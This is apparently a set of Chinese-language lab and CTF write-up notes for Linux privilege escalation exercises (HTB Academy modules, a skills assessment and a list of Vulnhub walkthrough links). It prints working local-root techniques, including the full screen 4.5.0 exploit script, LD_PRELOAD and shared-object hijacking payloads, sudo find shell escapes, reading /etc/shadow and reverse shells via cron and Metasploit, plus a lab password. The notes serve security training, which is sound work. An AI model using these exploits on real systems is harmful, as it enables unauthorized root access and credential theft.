利用`base64 /etc/shadow | base64 --decode`可以看到root和missy用户都有密码可以爆破，先尝试missy的
爆破出missy的密码，后台爆破root密码无果，登陆missy查看
missy可以无密码sudo执行find
可以用find提权了
`sudo find . -exec /bin/sh \; -quit`
  1. What is the content of the flag1.txt file?  
`find / -name flag1.txt`
  2. What is the content of the flag2.txt file?  
`find / -name flag2.txt`
## HTB ACADEMY
### Kernel Exploits
  1. Escalate privileges using the same Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel_exploit directory.  
`uname -a`查看系统内核信息为`Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12
21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux`  
将`[vulners.com/zdt/1337DAY-ID-30003](https://vulners.com/zdt/1337DAY-ID-30003)`的poc下载至操作机中  
利用python3的http服务将文件传输至目标机  
`gcc exploit.c -o exploit`并添加执行权限利用即可  
### Vulnerable Services
  1. Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory.
输入`find / -type f -perm 040000 -ls 2>/dev/null`查看SUID文件  
可以一个漏洞`screen-4.5.0`，同时具有SUID和GUID权限  
对其进行脚本提权
        #!/bin/bash
    # screenroot.sh
    # setuid screen v4.5.0 local root exploit
    # abuses ld.so.preload overwriting to get root.
    # bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
    # HACK THE PLANET
    # ~ infodox (25/1/2017)
    echo "~ gnu/screenroot ~"
    echo "[+] First, we create our shell and library..."
    cat  /tmp/libhax.c
    #include 
    #include 
    #include 
    #include 
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/tmp/rootshell", 0, 0);
        chmod("/tmp/rootshell", 04755);
        unlink("/etc/ld.so.preload");
        printf("[+] done!\n");
    }
    EOF
    gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
    rm -f /tmp/libhax.c
    cat  /tmp/rootshell.c
    #include 
    int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
    }
    EOF
    gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
    rm -f /tmp/rootshell.c
    echo "[+] Now we create our /etc/ld.so.preload file..."
    cd /etc
    umask 000 # because
    screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
    echo "[+] Triggering..."
    screen -ls # screen itself is setuid, so...
    /tmp/rootshell
提权成功  
### Cron Job Abuse
  1. Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory.  
查看`/etc/cron*`定时任务  
其中有一个backup有读写权限  
内容如下  
目标机器有`/bin/bash`命令，更改`backup`文件内容即可  
可以利用`find / -path /proc -prune -o -type f -perm -o+w
2>/dev/null`命令查看可写文件或目录，有一个`backup.sh`  
查看文件内容可以得知这个文件是用来备份网站数据的  
根据目录内文件的命名  
推断可能是定时任务每2分钟执行一次脚本，backup.sh是可读写文件  
修改脚本反弹shell，可以反弹属主root的shell  
### Special Permissions
  1. Find a file with the setuid bit set that was not shown in the section command output (full path to the binary).  
利用命令`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`一一对比
  2. Find a file with the setgid bit set that was not shown in the section command output (full path to the binary).  
利用命令`find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`一一对比
### Sudo Rights Abuse
  1. What command can the htb-student user run as root?  
输入命令`sudo -l`查看
### Path Abuse
  1. Review the PATH of the htb-student user. What non-default directory is path of the user's PATH?  
输入命令`echo $PATH`查看
### Credential Hunting
  1. Find the WordPress database password.  
wordpress的数据库连接配置文件是`wp-config.php`，进入网站目录即可看到  
### Shared Libraries
  1. Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.  
在`sudo -l`中可以看到可有执行`openssl`同时存在`env_keep+=LD_PRELOAD`  
利用脚本
        #include 
    #include 
    #include 
    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    }
同时编译后，执行`sudo LD_PRELOAD=/tmp/sudo.so /usr/bin/openssl`即可  
### Shared Object Hijacking
  1. Follow the examples in this section to escalate privileges, recreate all examples (don't just run the payroll binary). Practice using ldd and readelf. Submit the version of glibc (i.e. 2.30) in use to move on to the next section.
针对这个题目答案，输入`ldd --version`即可查看到GLIBC的版本号
**以下内容仅提供简单思路，有兴趣可以查看[EXploit Exercises -Nebula15](https://blog.csdn.net/luozhaotian/article/details/79819247)**  
`ldd payroll`查看程序共享对象文件
`readelf
-d payroll | grep PATH`查看共享库文件夹
可以整合一个`libc.so.6`文件
        #include
    #include
    asm(".symver puts, puts@GLIBC_2.2.5");
    void __cxa_finalize() {
        setuid(0);
        system("/bin/sh -p");
    } 
    void __libc_start_main(){
        __cxa_finalize();
    }
编译文件  
### Privileged Groups
  1. Use the privileged group rights of the secaudit user to locate a flag.  
`id`可以看到用户secaudit在adm组中，所以直接切换到`/var/log`目录
利用命令`find . | xargs grep -ri flag > /tmp/eval.txt`查看其日志中具有flag的文件  
在apache的access.log文件中有请求flag的url连接  
### Miscellaneous Techniques
  1. Review the NFS server's export list and find a directory holding a flag.  
可以直接使用账户查看`/etc/exports`  
flag文件在`/var/nfs/general/`目录下
###  Linux Local Privilege Escalation - Skills Assessment
> The client has provided us with a low privileged user to assess the security
> of the server. Connect via SSH and begin looking for misconfigurations and
> other flaws that may escalate privileges using the skills learned throughout
> this module.
>
> Once on the host, we must find five flags on the host, accessible at various
> privilege levels. Escalate privileges all the way from the htb-student user
> to the root user and submit all five flags to finish this module.
根据提示，查看主目录所有内容，可以看到`.config/.flag1.txt`
在`/home/barry`用户目录下有flag2.txt文件
列出用户目录所有文件，发现`.bash_history`文件可读
读取文件发现写入了ssh的密钥
利用ssh登陆barry用户
获取第二个flag值
因为没有密码，查看不了`sudo -l`，查看id的时候发现barry用户是adm组的
可以看看`/var/log`的信息，在tomcat的日志信息中可以查看到请求flag3.txt的链接
在`/var/log`目录下有`flag3.txt`文件  
有个`blog.inlanefreight.local`需要在hosts文件中指向ip
`netstat -anptl`看到有个8080端口
访问可以看到tomcat的页面，有指向管理界面的链接
在其描述中的`/var/lib/tomcat9`有flag4文件，但需要提权到`tomcat`用户
`Users are defined in /etc/tomcat9/tomcat-users.xml.`
这个描述的文件夹可以看到
用户`tomcatadm`出现在日志中登陆，密码为`T0mc@t_s3cret_p@ss!`，成功登陆网页，无法登陆用户`tomcat`
利用`msfconsole`的tomcat模块反弹一个shell
反弹成功，获取flag值
输入`shell`，进入shell之后，`python3 -c 'import pty;
pty.spawn("/bin/bash")'`反弹一个交互式shell
`sudo -l`有一个`busctl`的无需密码的root权限
直接`sudo busctl --show-machine`即可
flag在`/root`目录下
  1. Submit the contents of flag1.txt(Perform thorough enumeration of the file system as this user.)
  2. Submit the contents of flag2.txt(Users are often the weakest link...)
  3. Submit the contents of flag3.txt
  4. Submit the contents of flag4.txt(Look at all external services running on the box.)
  5. Submit the contents of flag5.txt
## Vulnhub中的Linux提权靶场练习
[作者github连接](https://github.com/rishabhkant07)
This is a Cheatsheet for CTF Challenges categorized by different Privilege
Escalation Methods
  1. [Holynix: v1](https://www.hackingarticles.in/hack-the-holynix-v1-boot-2-root-challenge/)
  2. [DE-ICE:S1.120](https://www.hackingarticles.in/hack-the-de-ice-s1-120-vm-boot-to-root/)
  3. [21 LTR: Scene1](https://www.hackingarticles.in/hack-the-21ltr-scene-1-vm-boot-to-root/)
  4. [Kioptrix : Level 1.2](https://www.hackingarticles.in/hack-the-kioptrix-level-1-2-boot2root-challenge/)
  5. [Skytower](https://www.hackingarticles.in/hack-the-skytower-ctf-challenge/)
  6. [Fristileaks](https://www.hackingarticles.in/hack-fristileaks-vm-ctf-challenge/)
  7. [Breach 2.1](https://www.hackingarticles.in/hack-breach-2-1-vm-ctf-challenge/)
  8. [Zico 2](https://www.hackingarticles.in/hack-zico2-vm-ctf-challenge/)
  9. [RickdiculouslyEasy](https://www.hackingarticles.in/hack-rickdiculouslyeasy-vm-ctf-challenge/)
  10. [Dina](https://www.hackingarticles.in/hack-dina-vm-ctf-challenge/)
  11. [Depth](https://www.hackingarticles.in/hack-depth-vm-ctf-challenge/)
  12. [The Ether: Evil Science](https://www.hackingarticles.in/hack-ether-evilscience-vm-ctf-challenge/)
  13. [Basic penetration](https://www.hackingarticles.in/hack-the-basic-penetration-vm-boot2root-challenge/)
  14. [DerpNStink](https://www.hackingarticles.in/hack-the-derpnstink-vm-ctf-challenge/)
  15. [W1R3S.inc](https://www.hackingarticles.in/hack-the-w1r3s-inc-vm-ctf-challenge/)
  16. [Bob:1.0.1](https://www.hackingarticles.in/hack-the-bob-1-0-1-vm-ctf-challenge/)
  17. [The blackmarket](https://www.hackingarticles.in/hack-the-blackmarket-vm-ctf-challenge/)
  18. [Violator](https://www.hackingarticles.in/hack-the-violator-ctf-challenge/)
  19. [Basic Pentesting : 2](https://www.hackingarticles.in/hack-the-basic-pentesting2-vm-ctf-challenge/)
  20. [Temple of Doom](https://www.hackingarticles.in/hack-the-temple-of-doom-ctf-challenge/)
  21. [Wakanda : 1](https://www.hackingarticles.in/hack-the-wakanda-1-ctf-challenge/)
  22. [Matrix : 1](https://www.hackingarticles.in/matrix-1-vulnhub-walkthrough/)
  23. [KFIOFan : 1](https://www.hackingarticles.in/kfiofan1-vulnhub-walkthrough/)
  24. [W34n3ss 1](https://www.hackingarticles.in/w34kn3ss-1-vulnhub-lab-walkthrough/)
  25. [Replay : 1](https://www.hackingarticles.in/replay-1-vulnhub-lab-walkthrough/)
  26. [Unknowndevice64 : 1](https://www.hackingarticles.in/unknowndevice64-v2-0-vulnhub-walkthrough/)
  27. [Web Developer : 1](https://www.hackingarticles.in/web-developer-1-vulnhub-lab-walkthrough/)
  28. [SP ike](https://www.hackingarticles.in/sp-ike-vulnhub-lab-walkthrough/)
  29. [DC-2](https://www.hackingarticles.in/dc-2-walkthrough/)
  30. [DC6](https://www.hackingarticles.in/dc6-lab-walkthrough/)
  31. [Born2Root2](https://www.hackingarticles.in/born2root-2-vulnhub-walkthrough/)
  32. [DC-4](https://www.hackingarticles.in/dc-4-vulnhub-walkthrough/)
  33. [Development](https://www.hackingarticles.in/development-vulnhub-walkthrough/)
  34. [Sputnik 1](https://www.hackingarticles.in/sputnik-1-vulnhub-walkthrough/)
  35. [PumpkinRaising](https://www.hackingarticles.in/pumpkinraising-vulnhub-walkthrough/)
  36. [Matrix-3](https://www.hackingarticles.in/matrix-3-vulnhub-walkthrough/)
  37. [symfonos : 2](https://www.hackingarticles.in/symfonos2-vulnhub-walkthrough/)
  38. [Digitalworld.local : JOY](https://www.hackingarticles.in/digitalworld-local-joy-vulnhub-walkthrough/)
  39. [PumpkinFestival](https://www.hackingarticles.in/mission-pumpkin-v1-0-pumpkinfestival-vulnhub-walkthrough/)
  40. [Sunset](https://www.hackingarticles.in/sunset-vulnhub-walkthrough/)
  41. [Symfonos:3](https://www.hackingarticles.in/symfonos3-vulnhub-walkthrough/)
  42. [Ted:1](https://www.hackingarticles.in/ted1-vulnhub-walkthrough/)
  43. [CLAMP 1.0.1](https://www.hackingarticles.in/clamp-1-0-1-vulnhub-walkthrough/)
  44. [Torment](https://www.hackingarticles.in/digitalworld-localtorment-vulnhub-walkthrough/)
  45. [WestWild: 1.1](https://www.hackingarticles.in/westwild-1-1-vulnhub-walkthorugh/)
  46. [Broken: Gallery](https://www.hackingarticles.in/broken-gallery-vulnhub-walkthrough/)